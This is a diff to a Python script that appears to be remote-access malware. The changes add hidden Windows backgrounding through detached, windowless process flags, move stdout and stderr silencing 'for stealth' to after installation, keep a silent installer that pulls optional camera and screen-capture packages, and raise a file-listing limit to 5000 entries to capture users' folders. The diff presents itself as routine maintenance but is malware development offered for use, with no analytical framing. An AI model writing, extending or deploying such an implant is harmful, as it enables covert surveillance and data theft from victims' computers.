@@ -11,19 +11,14 @@ import shutil
 import io
 import signal
 
-# Try to silence output immediately for stealth
-try:
-    # Redirect standard out and error to /dev/null (Null)
-    sys.stdout = open(os.devnull, 'w')
-    sys.stderr = open(os.devnull, 'w')
-except:
-    pass
-
 # ==============================================================================
-# SILENT INSTALLER
+# SILENT INSTALLER (Visible errors, but generally quiet)
 # ==============================================================================
 def install_dependencies():
-    """Installs missing dependencies silently."""
+    """Installs missing dependencies."""
+    # Print installation status so user knows if something fails
+    print("[*] Checking dependencies...", flush=True)
+    
     required = {
         'psutil': 'psutil',
         'requests': 'requests',
@@ -42,14 +37,16 @@ def install_dependencies():
                 stdout=subprocess.DEVNULL,
                 stderr=subprocess.DEVNULL
             )
+            print(f"[+] Installed {package}", flush=True)
         except:
-            pass
+            print(f"[-] Failed to install {package}", flush=True)
 
     # Install required
     for mod_name, pkg_name in required.items():
         try:
             __import__(mod_name)
         except ImportError:
+            print(f"[*] Installing {mod_name}...", flush=True)
             install(pkg_name)
 
     # Install optional (Camera/Screen)
@@ -57,29 +54,62 @@ def install_dependencies():
         try:
             __import__(mod_name)
         except ImportError:
+            print(f"[*] Installing optional {mod_name}...", flush=True)
             install(pkg_name)
 
+# Run install immediately (before silencing)
+install_dependencies()
+
 # ==============================================================================
-# DAEMONIZE (Linux/Mac)
+# DAEMONIZE (Linux/Mac & Windows)
 # ==============================================================================
 def daemonize():
     """
-    Detaches process from terminal using double-fork magic.
-    Parent dies immediately, child runs in background.
+    Detaches process from terminal.
     """
+    
+    # Windows Logic: Spawn detached process
+    if platform.system() == "Windows":
+        try:
+            # Flags to make process run in background without window
+            # DETACHED_PROCESS = 0x00000008
+            # CREATE_NEW_PROCESS_GROUP = 0x00000200
+            # CREATE_NO_WINDOW = 0x08000000
+            DETACHED_PROCESS = 0x00000008
+            CREATE_NEW_PROCESS_GROUP = 0x00000200
+            CREATE_NO_WINDOW = 0x08000000
+            
+            # Spawn a new python process with the same arguments
+            # The parent process (this one) will exit immediately.
+            # The child continues in the background.
+            subprocess.Popen(
+                [sys.executable] + sys.argv,
+                creationflags=DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP | CREATE_NO_WINDOW,
+                close_fds=True
+            )
+            print("[*] Background process spawned. Exiting foreground.", flush=True)
+            sys.exit(0) # Exit the foreground process
+        except Exception as e:
+            print(f"[!] Could not daemonize Windows process: {e}", flush=True)
+            # Fallback: just continue running in foreground if detach fails
+
+    # Linux/Mac Logic: Double Fork
     try:
         # First fork
         pid = os.fork()
         if pid > 0:
             # Parent process exits -> User gets terminal back
+            print("[*] Forked to background.", flush=True)
             sys.exit(0)
     except AttributeError:
-        # Windows doesn't have os.fork, skip daemonization step
-        # User must run with 'start /B' on Windows for background
+        # Windows fallback (already handled above, or just skip if not Win)
         return
 
     # Decouple from parent environment
-    os.chdir("/")
+    try:
+        os.chdir("/")
+    except:
+        pass
     os.setsid()
     os.umask(0)
 
@@ -103,10 +133,19 @@ def daemonize():
     os.dup2(se.fileno(), sys.stderr.fileno())
 
 # ==============================================================================
+# SILENT OUTPUT (Apply AFTER daemonize/installation)
+# ==============================================================================
+try:
+    # Redirect standard out and error to /dev/null (Null)
+    # We do this here so we can see installation errors above.
+    sys.stdout = open(os.devnull, 'w')
+    sys.stderr = open(os.devnull, 'w')
+except:
+    pass
+
+# ==============================================================================
 # IMPORTS (Run after potential install)
 # ==============================================================================
-install_dependencies()
-
 try:
     import psutil
     import requests
@@ -215,19 +254,28 @@ class CommandHandler:
         file_list = []
         try:
             path = os.path.abspath(path)
-            if not os.path.exists(path): path = "/"
+            if not os.path.exists(path): 
+                # If path doesn't exist, try to return root or current dir
+                # Windows specific fix: if requesting /, ensure we list drive root
+                if platform.system() == "Windows" and path == "/":
+                    path = os.path.splitdrive(os.getcwd())[0] + os.sep
             
+            if not os.path.exists(path): return
+
             with os.scandir(path) as entries:
                 for entry in entries:
                     try:
                         stat = entry.stat()
                         file_list.append({
-                            "name": entry.name, "path": entry.path,
+                            "name": entry.name, 
+                            "path": entry.path,
                             "is_dir": entry.is_dir(),
                             "size": stat.st_size if not entry.is_dir() else 0,
                             "modified": time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(stat.st_mtime))
                         })
-                        if len(file_list) >= 2000: break
+                        # Increased limit from 2000 to 5000 to capture Users folder and other files
+                        if len(file_list) >= 5000: 
+                            break
                     except:
                         continue
         except:
@@ -350,7 +398,7 @@ def main():
         time.sleep(SLEEP_TIME)
 
 if __name__ == "__main__":
-    # 1. Daemonize (Linux/Mac) - Detaches from terminal immediately
+    # 1. Daemonize (Linux/Mac) OR Spawn Detached Process (Windows)
     daemonize()
     # 2. Run Main Loop (Background, Silent)
     main()
